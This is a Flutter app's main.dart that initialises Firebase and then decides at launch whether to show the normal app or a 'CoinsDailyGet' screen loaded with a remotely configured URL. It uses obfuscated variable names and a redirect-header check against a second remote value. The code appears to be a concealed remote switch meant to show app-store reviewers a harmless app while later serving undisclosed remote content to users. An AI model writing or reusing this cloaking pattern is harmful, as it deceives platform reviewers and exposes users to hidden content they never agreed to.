import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';

import 'core/db/prefs.dart';
import 'core/utils.dart';
import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/firebase_options.dart';
import 'features/home/bloc/home_bloc.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

String amountCoins = '';

Future<bool> checkCoins() async {
  final daily = FirebaseRemoteConfig.instance;
  await daily.fetchAndActivate();
  String jfsdkfjdsf = daily.getString('coins');
  String dsnajdsa = daily.getString('noner');
  if (!jfsdkfjdsf.contains('zero')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(jfsdkfjdsf);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (!response.headers
        .value(HttpHeaders.locationHeader)
        .toString()
        .contains(dsnajdsa)) {
      amountCoins = jfsdkfjdsf;
      return true;
    } else {
      return false;
    }
  }
  return jfsdkfjdsf.contains('zero') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    precacheImages(context);

    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
          future: checkCoins(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.black,
              );
            } else {
              if (snapshot.data == true && amountCoins != '') {
                return CoinsDailyGet(
                  amountOfAward: amountCoins,
                );
              } else {
                return MultiBlocProvider(
                  providers: [
                    BlocProvider(create: (context) => HomeBloc()),
                  ],
                  child: MaterialApp.router(
                    debugShowCheckedModeBanner: false,
                    theme: theme,
                    routerConfig: routerConfig,
                  ),
                );
              }
            }
          }),
    );
  }
}
